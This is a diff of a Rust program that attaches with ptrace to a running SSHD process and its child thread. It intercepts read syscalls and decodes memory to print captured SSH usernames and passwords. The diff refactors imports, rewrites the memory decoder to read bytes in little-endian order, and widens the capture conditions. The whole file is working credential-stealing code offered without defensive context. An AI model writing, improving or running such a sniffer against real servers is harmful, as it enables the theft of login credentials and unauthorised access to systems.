@@ -1,10 +1,19 @@
 #![allow(non_snake_case)]
 
+use nix::{
+            unistd::Pid, 
+            sys::{ptrace::{self, AddressType, Options}, wait}
+        };
+use sysinfo::System;
+use sysnames::Syscalls;
+use byteorder::{WriteBytesExt, LittleEndian};
+
+
 
 pub fn getPID() -> sysinfo::Pid {
   
     // Create sysinfo object and refresh to collect current os state
-    let mut sys = sysinfo::System::new_all();
+    let mut sys = System::new_all();
     sys.refresh_all();
 
     // Getting the SSHD process
@@ -17,35 +26,35 @@ pub fn getPID() -> sysinfo::Pid {
 
 
 
-pub fn checkTHREAD(pid: sysinfo::Pid) -> nix::unistd::Pid {
+pub fn checkTHREAD(pid: sysinfo::Pid) -> Pid {
 
     // Changing sysinfo::Pid as i32 passed over nix::unistd::Pid
-    let pid = nix::unistd::Pid::from_raw(pid.as_u32() as i32);
+    let pid = Pid::from_raw(pid.as_u32() as i32);
 
     // Attaching to SSHD
-    nix::sys::ptrace::attach(pid).unwrap();
+    ptrace::attach(pid).unwrap();
 
     // Wait for SIGTRAP signal
-    nix::sys::wait::waitpid(pid, None).unwrap();
+    wait::waitpid(pid, None).unwrap();
 
     // Tracing all options 
-    nix::sys::ptrace::setoptions(pid, nix::sys::ptrace::Options::all()).unwrap();
+    ptrace::setoptions(pid, Options::all()).unwrap();
 
     // Continuing process
-    nix::sys::ptrace::cont(pid, None).unwrap();
+    ptrace::cont(pid, None).unwrap();
 
     // Wait for SIGTRAP signal
-    nix::sys::wait::waitpid(pid, None).unwrap();
+    wait::waitpid(pid, None).unwrap();
 
     // Getting child PID as i32
-    let child_pid = nix::sys::ptrace::getevent(pid).unwrap() as i32;
+    let child_pid = ptrace::getevent(pid).unwrap() as i32;
 
     // Changing child i32 as nix::unistd::PID
-    let child_pid = nix::unistd::Pid::from_raw(child_pid);
+    let child_pid = Pid::from_raw(child_pid);
 
     // Detach with no signal or die
-    nix::sys::ptrace::detach(child_pid, None).unwrap();
-    nix::sys::ptrace::detach(pid, None).unwrap();
+    ptrace::detach(child_pid, None).unwrap();
+    ptrace::detach(pid, None).unwrap();
 
     // Child PID
     child_pid
@@ -54,13 +63,13 @@ pub fn checkTHREAD(pid: sysinfo::Pid) -> nix::unistd::Pid {
 
 
 
-pub fn debugTHREAD(pid: nix::unistd::Pid) {
+pub fn debugTHREAD(pid: Pid) {
     
     // Attaching to child
-    nix::sys::ptrace::attach(pid).unwrap();
+    ptrace::attach(pid).unwrap();
 
     // Wait for SIGTRAP signal
-    nix::sys::wait::waitpid(pid, None).unwrap();
+    wait::waitpid(pid, None).unwrap();
 
     // Counter to print Username and Password
     let mut count = 0;
@@ -68,32 +77,32 @@ pub fn debugTHREAD(pid: nix::unistd::Pid) {
     loop {
             
         // Invokes syscall
-        nix::sys::ptrace::syscall(pid, None).unwrap();
+        ptrace::syscall(pid, None).unwrap();
 
         // Wait for SIGTRAP signal
-        let _wait = nix::sys::wait::waitpid(pid, None).unwrap();
+        let _wait = wait::waitpid(pid, None).unwrap();
 
         match _wait {
-            nix::sys::wait::WaitStatus::Exited(pid, status) => {
-                                                                    println!("Child {pid} exited with status {status}");
-                                                                    std::process::exit(1);
-                                                                },
+            wait::WaitStatus::Exited(pid, status) => {
+                                                        println!("\n\n{}Child {pid} exited with status {status}", "\t".repeat(5));
+                                                        std::process::exit(1);
+                                                    },
             _ => {
                     // Gettiing registers
-                    let reg = nix::sys::ptrace::getregs(pid).unwrap();
+                    let reg = ptrace::getregs(pid).unwrap();
 
-                    // Checking for Username and Password
-                    if (0..2).contains(&count) && sysnames::Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..20).contains(&(reg.rdx as u16)) {
+                    // Getting and Checking for Username and Password
+                    if (0..5).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) {
                         count += 1;
                         
-                        if !decoder(pid, reg.rsi as nix::sys::ptrace::AddressType).is_empty() {
-                            println!("\n\n{} Username: {} Captured at: {:?}\n\n", "\t".repeat(5), decoder(pid, reg.rsi as nix::sys::ptrace::AddressType), reg.rsi as nix::sys::ptrace::AddressType);
+                        if !decoder(pid, reg.rsi as AddressType).is_empty() && decoder(pid, reg.rsi as AddressType).is_ascii() {
+                            println!("\n\n{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                         }
 
-                    } else if (2..5).contains(&count) && sysnames::Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..20).contains(&(reg.rdx as u16)) {
+                    } else if (5..).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) {
                         
-                        if !decoder(pid, reg.rsi as nix::sys::ptrace::AddressType).is_empty() {
-                            println!("{} Password:{} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as nix::sys::ptrace::AddressType), reg.rsi as nix::sys::ptrace::AddressType);
+                        if !decoder(pid, reg.rsi as ptrace::AddressType).is_empty() {
+                            println!("\n{} Password: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                         }
 
                     }
@@ -104,35 +113,45 @@ pub fn debugTHREAD(pid: nix::unistd::Pid) {
 
 
 
-pub fn decoder(pid: nix::unistd::Pid, addr: nix::sys::ptrace::AddressType) -> String {
+pub fn decoder(pid: Pid, addr: AddressType) -> String {
     
-    // Reading RSI
-    let address = format!("{:?}", nix::sys::ptrace::read(pid, addr).unwrap() as nix::sys::ptrace::AddressType);
+    // Converting Addr to i64
+    let mut addr = addr as i64;
 
-    // Retrieving Username || Password
     let mut string = String::new();
+    let mut check = 0;
 
-    // Storing the splited data
-    let mut data = String::new();
+    loop {
 
-    for i in address.trim().split("0x").last().unwrap().chars() {
-        
-        data.push(i);
+        let mut bytes: Vec<_> = Vec::new();
+        let res = nix::sys::ptrace::read(pid, addr as nix::sys::ptrace::AddressType).unwrap();
 
-        if data.len() == 2 {
-        
-            // Hex to String
-            let hex_value = u32::from_str_radix(data.clone().as_str(), 16).unwrap();
 
-            // Integer to char
-            let character = char::from_u32(hex_value).unwrap();
+        bytes.write_i64::<LittleEndian>(res).unwrap_or_else(|err| {
+            panic!("Error to write {} as i64 LittleEndian: {}", res, err);
+        });
 
-            string.push(character.clone());
-            data = String::new();
+
+        for b in bytes.clone() {
+            
+            if b != 0 {
+                string.push(b as char);
+            } else {
+                continue;
+            }
+
         }
+
+        // Check for username and password
+        if string.chars().nth(1) >= Some(check as u8 as char) {
+            addr += 8;
+            check += 1;
+        } else {
+            break;
+        }
+
     }
-
-    // Reversing string
-    string.trim().chars().rev().collect()
-
+     
+    let string = string.split("ssh-connection").last().unwrap();
+    string.trim().to_string()
 }
